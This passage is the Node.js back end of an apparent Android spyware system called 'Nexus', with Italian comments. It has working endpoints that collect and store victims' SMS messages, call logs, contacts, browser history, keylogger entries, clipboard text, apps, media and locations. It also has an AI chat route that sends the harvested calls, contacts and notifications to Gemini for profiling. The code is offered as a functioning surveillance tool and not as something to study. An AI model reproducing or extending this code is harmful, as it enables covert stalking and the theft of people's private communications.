  if (!req.file) return res.status(400).json({ ok: false, error: 'no file' });
  const metaFile = path.join(DATA_DIR, 'backups', deviceId, 'meta.json');
  const meta = readJSON(metaFile, []);
  const originalName = safeFilename(req.file.originalname);
  const exists = meta.find(m => m.originalName === originalName && m.size === req.file.size);
  if (exists) {
    try { fs.unlinkSync(req.file.path); } catch {}
    return res.json({ ok: true, dedup: true, filename: exists.name });
  }
  const entry = {
    name: req.file.filename,
    originalName,
    size: req.file.size,
    mime: req.file.mimetype,
    ts: Date.now(),
    source: 'extra_folder'
  };
  meta.unshift(entry);
  writeJSON(metaFile, bounded(meta));
  broadcast('backup_new', { deviceId, ...entry });
  res.json({ ok: true, filename: entry.name });
});

app.get('/api/backups/:deviceId', checkAuth, (req, res) => {
  const metaFile = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), 'meta.json');
  res.json(readJSON(metaFile, []));
});

app.get('/api/backups/:deviceId/:filename', checkAuth, (req, res) => {
  const file = path.join(DATA_DIR, 'backups', safeDeviceId(req.params.deviceId), safeFilename(req.params.filename));
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'not found' });
  res.sendFile(file);
});

// ── SMS ───────────────────────────────────────────────────────
app.post('/api/sms/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { messages } = req.body;
  if (!Array.isArray(messages)) return res.json({ ok: false });
  const file = deviceFile('sms', deviceId);
  const existing = readJSON(file, []);
  const smsKey = m => (m.id || m._id) ? `id:${m.id || m._id}` : `fallback:${m.address || m.number || m.phoneNumber || m.from || ''}:${m.date || m.timestamp || m.ts || ''}:${m.body || m.text || m.message || ''}`;
  const ids = new Set(existing.map(smsKey));
  const newMsgs = messages.filter(m => {
    const key = smsKey(m);
    if (ids.has(key)) return false;
    ids.add(key);
    return true;
  });
  writeJSON(file, bounded([...existing, ...newMsgs]));
  if (newMsgs.length) broadcast('sms_new', { deviceId, count: newMsgs.length });
  res.json({ ok: true, added: newMsgs.length });
});

app.get('/api/sms/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('sms', req.params.deviceId);
  const msgs = readJSON(file, []);
  msgs.sort((a, b) => (b.date || b.ts || 0) - (a.date || a.ts || 0));
  res.json(msgs);
});

// ── Call log ──────────────────────────────────────────────────
app.post('/api/calllog/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { calls } = req.body;
  if (!Array.isArray(calls)) return res.json({ ok: false });
  const file = deviceFile('calllog', deviceId);
  const existing = readJSON(file, []);
  const ids = new Set(existing.map(c => `${c.number}_${c.date}`));
  const newCalls = calls.filter(c => !ids.has(`${c.number}_${c.date}`));
  writeJSON(file, bounded([...existing, ...newCalls]));
  if (newCalls.length) broadcast('calllog_new', { deviceId, count: newCalls.length });
  res.json({ ok: true, added: newCalls.length });
});

app.get('/api/calllog/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('calllog', req.params.deviceId);
  const calls = readJSON(file, []);
  calls.sort((a, b) => (b.date || 0) - (a.date || 0));
  res.json(calls);
});

// ── Contatti ──────────────────────────────────────────────────
app.post('/api/contacts/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { contacts } = req.body;
  if (!Array.isArray(contacts)) return res.json({ ok: false });
  writeJSON(deviceFile('contacts', deviceId), contacts);
  res.json({ ok: true, total: contacts.length });
});

app.get('/api/contacts/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('contacts', req.params.deviceId), []));
});

// ── Browser history ───────────────────────────────────────────
app.post('/api/browser/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { history } = req.body;
  if (!Array.isArray(history)) return res.json({ ok: false });
  const file = deviceFile('browser', deviceId);
  const existing = readJSON(file, []);
  const urls = new Set(existing.map(h => `${h.url}_${h.ts}`));
  const newItems = history.filter(h => !urls.has(`${h.url}_${h.ts}`));
  writeJSON(file, bounded([...existing, ...newItems]));
  res.json({ ok: true, added: newItems.length });
});

app.get('/api/browser/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('browser', req.params.deviceId);
  const history = readJSON(file, []);
  history.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  res.json(history);
});

// ── Keylogger ─────────────────────────────────────────────────
app.post('/api/keylog/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { entries } = req.body;
  if (!Array.isArray(entries)) return res.json({ ok: false });
  const file = deviceFile('keylog', deviceId);
  const existing = readJSON(file, []);
  const sanitize = s => typeof s === 'string' ? s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, ' ') : s;
  const newEntries = entries.map(e => ({ ...e, text: sanitize(e.text), ts: e.ts || Date.now() }));
  writeJSON(file, bounded([...existing, ...newEntries]));
  res.json({ ok: true, added: newEntries.length });
});

app.get('/api/keylog/:deviceId', checkAuth, (req, res) => {
  const file = deviceFile('keylog', req.params.deviceId);
  const entries = readJSON(file, []);
  entries.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  res.json(entries);
});

// ── Clipboard ─────────────────────────────────────────────────
app.post('/api/clipboard/:deviceId', checkAuth, (req, res) => {
  const { deviceId } = req.params;
  const { text, ts } = req.body;
  if (!text) return res.json({ ok: false });
  const file = deviceFile('clipboard', deviceId);
  const existing = readJSON(file, []);
  existing.unshift({ text, ts: ts || Date.now() });
  writeJSON(file, existing.slice(0, MAX_RECORDS));
  broadcast('clipboard_new', { deviceId, text: text.substring(0, 50) });
  res.json({ ok: true });
});

app.get('/api/clipboard/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('clipboard', req.params.deviceId), []));
});

// ── App installate ────────────────────────────────────────────
app.post('/api/apps/:deviceId', checkAuth, (req, res) => {
  const { apps } = req.body;
  if (!Array.isArray(apps)) return res.json({ ok: false });
  writeJSON(deviceFile('apps', req.params.deviceId), apps);
  res.json({ ok: true, total: apps.length });
});

app.get('/api/apps/:deviceId', checkAuth, (req, res) => {
  res.json(readJSON(deviceFile('apps', req.params.deviceId), []));
});

// ── Diagnostica dispositivo (nessun contenuto personale) ─────
app.post('/api/status/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const status = req.body && req.body.status;
  if (!status || typeof status !== 'object' || Array.isArray(status)) {
    return res.status(400).json({ ok: false, error: 'invalid status' });
  }
  const clean = { ...status, receivedAt: Date.now() };
  writeJSON(deviceFile('status', deviceId), clean);
  const devicesFile = path.join(DATA_DIR, 'devices.json');
  const devices = readJSON(devicesFile, {});
  if (devices[deviceId]) {
    devices[deviceId].status = clean;
    writeJSON(devicesFile, devices);
  }
  broadcast('device_status', { deviceId, status: clean });
  res.json({ ok: true });
});

app.get('/api/status/:deviceId', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const saved = readJSON(deviceFile('status', deviceId), null);
  if (saved) return res.json(saved);
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  res.json(devices[deviceId]?.status || {});
});

// ── Stats ─────────────────────────────────────────────────────
app.get('/api/stats', checkAuth, (req, res) => {
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const now = Date.now();
  const stats = { devices: {}, totals: { devices: 0, media: 0, events: 0, calls: 0, sms: 0, contacts: 0, apps: 0 } };
  Object.entries(devices).forEach(([id, d]) => {
    const media = readJSON(path.join(DATA_DIR, 'media', id, 'meta.json'), []);
    const events = readJSON(deviceFile('events', id), []);
    const calls = readJSON(deviceFile('calllog', id), []);
    const sms = readJSON(deviceFile('sms', id), []);
    const contacts = readJSON(deviceFile('contacts', id), []);
    const apps = readJSON(deviceFile('apps', id), []);
    const screenshots = readJSON(path.join(DATA_DIR, 'screenshots', id, 'meta.json'), []);
    const audio = readJSON(path.join(DATA_DIR, 'audio', id, 'meta.json'), []);
    stats.devices[id] = {
      name: d.deviceName || id,
      online: (now - (d.lastSeen || 0)) < ONLINE_WINDOW_MS,
      battery: d.battery,
      network: d.network,
      media: media.length,
      events: events.length,
      calls: calls.length,
      sms: sms.length,
      contacts: contacts.length,
      apps: apps.length,
      screenshots: screenshots.length,
      audio: audio.length,
      lastSeen: d.lastSeen
    };
    stats.totals.media += media.length;
    stats.totals.events += events.length;
    stats.totals.calls += calls.length;
    stats.totals.sms += sms.length;
    stats.totals.contacts += contacts.length;
    stats.totals.apps += apps.length;
    stats.totals.devices++;
  });
  res.json(stats);
});

// ── ZIP media ─────────────────────────────────────────────────
const zipJobs = {};
app.post('/api/media/:deviceId/zip/prepare', checkAuth, (req, res) => {
  const deviceId = safeDeviceId(req.params.deviceId);
  const jobId = uuidv4();
  zipJobs[jobId] = { status: 'running', deviceId };
  const dir = path.join(DATA_DIR, 'media', deviceId);
  const zipPath = path.join(DATA_DIR, 'zips', `media_${deviceId}_${jobId}.zip`);
  fs.mkdirSync(path.join(DATA_DIR, 'zips'), { recursive: true });
  const { spawn } = require('child_process');
  const proc = spawn('zip', ['-r', zipPath, '.'], { cwd: dir });
  proc.on('close', code => {
    if (code === 0) {
      const stat = fs.statSync(zipPath);
      zipJobs[jobId] = { status: 'done', zipPath, size: stat.size };
    } else {
      zipJobs[jobId] = { status: 'error' };
    }
    setTimeout(() => delete zipJobs[jobId], 3600000);
  });
  res.json({ ok: true, jobId });
});

app.get('/api/media/:deviceId/zip/status', checkAuth, (req, res) => {
  const job = zipJobs[req.query.jobId];
  if (!job) return res.json({ status: 'not_found' });
  res.json(job);
});

app.get('/api/media/:deviceId/zip/download', checkAuth, (req, res) => {
  const job = zipJobs[req.query.jobId];
  if (!job || job.status !== 'done') return res.status(404).json({ error: 'not ready' });
  res.download(job.zipPath);
});

// ── iCloud connector ──────────────────────────────────────────
createICloudService({ app, checkAuth, DATA_DIR, broadcast });

// ── AI Chat ───────────────────────────────────────────────────
app.post('/api/ai/chat', checkAuth, async (req, res) => {
  const { message, deviceId } = req.body;
  if (!message) return res.status(400).json({ error: 'message required' });

  // Raccoglie dati interni come contesto
  const devices = readJSON(path.join(DATA_DIR, 'devices.json'), {});
  const targetDevice = deviceId || Object.keys(devices)[0];
  
  let context = `Sei un assistente AI che analizza dati di monitoraggio dispositivi Android. Rispondi SOLO su dati interni del sistema. Non rispondere a domande esterne.\n\n`;
  
  if (targetDevice) {
    const calls = readJSON(deviceFile('calllog', targetDevice), []);
    const sms = readJSON(deviceFile('sms', targetDevice), []);
    const events = readJSON(deviceFile('events', targetDevice), []);
    const media = readJSON(path.join(DATA_DIR, 'media', targetDevice, 'meta.json'), []);
    const locs = readJSON(deviceFile('locations', targetDevice), []);
    const contacts = readJSON(deviceFile('contacts', targetDevice), []);
    
    context += `Device: ${devices[targetDevice]?.deviceName || targetDevice}\n`;
    context += `Totale chiamate: ${calls.length}\n`;
    context += `Totale SMS: ${sms.length}\n`;
    context += `Totale notifiche: ${events.length}\n`;
    context += `Totale media: ${media.length}\n`;
    context += `Totale posizioni: ${locs.length}\n`;
    context += `Totale contatti: ${contacts.length}\n`;
    
    // Ultime 10 chiamate
    const lastCalls = calls.slice(0, 10).map(c => 
      `${new Date(c.date).toLocaleString('it-IT')} - ${c.name || c.number} (${c.duration}s)`
    ).join('\n');
    context += `\nUltime chiamate:\n${lastCalls}\n`;

    // Top 5 contatti per chiamate
    const callStats = {};
    calls.forEach(c => {
      const k = c.name || c.number;
      callStats[k] = (callStats[k] || 0) + 1;
    });
    const top5 = Object.entries(callStats).sort((a,b) => b[1]-a[1]).slice(0,5);
    context += `\nTop contatti: ${top5.map(([n,c]) => `${n}(${c})`).join(', ')}\n`;

    // Ultime notifiche
    const lastEvents = events.slice(0, 10).map(e =>
      `${e.app}: ${(e.title||'').substring(0,30)} - ${(e.body||'').substring(0,50)}`
    ).join('\n');
    context += `\nUltime notifiche:\n${lastEvents}\n`;
  }

  try {
    // Usa Gemini API (gratuita)
    const GEMINI_KEY = process.env.GEMINI_API_KEY || '';
    if (!GEMINI_KEY) {
      return res.json({ reply: `[AI non configurata — aggiungi GEMINI_API_KEY]\n\nContesto disponibile:\n${context.substring(0, 500)}` });
    }
    const resp = await fetch(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          contents: [{
            parts: [{ text: `${context}\n\nDomanda utente: ${message}` }]
          }],
          generationConfig: { maxOutputTokens: 1024, temperature: 0.3 }
        })
      }
    );
    const data = await resp.json();
    const reply = data.candidates?.[0]?.content?.parts?.[0]?.text || 'Nessuna risposta';
    res.json({ reply });
  } catch (e) {
    res.json({ reply: `Errore AI: ${e.message}` });
  }
});

// ── Fallback → dashboard ──────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[request]', err.message);
  if (res.headersSent) return next(err);
  res.status(err.message && err.message.startsWith('invalid ') ? 400 : 500)
    .json({ ok: false, error: err.message || 'internal error' });
});

app.get('/{*path}', (req, res) => {
  const index = path.join(DASHBOARD_DIR, 'index.html');
  if (fs.existsSync(index)) return res.sendFile(index);
  res.send('Nexus Server Online');
});

// ── Uncaught errors ───────────────────────────────────────────
process.on('uncaughtException', e => console.error('[uncaughtException]', e.message));
process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Nexus server running on port ${PORT}`));
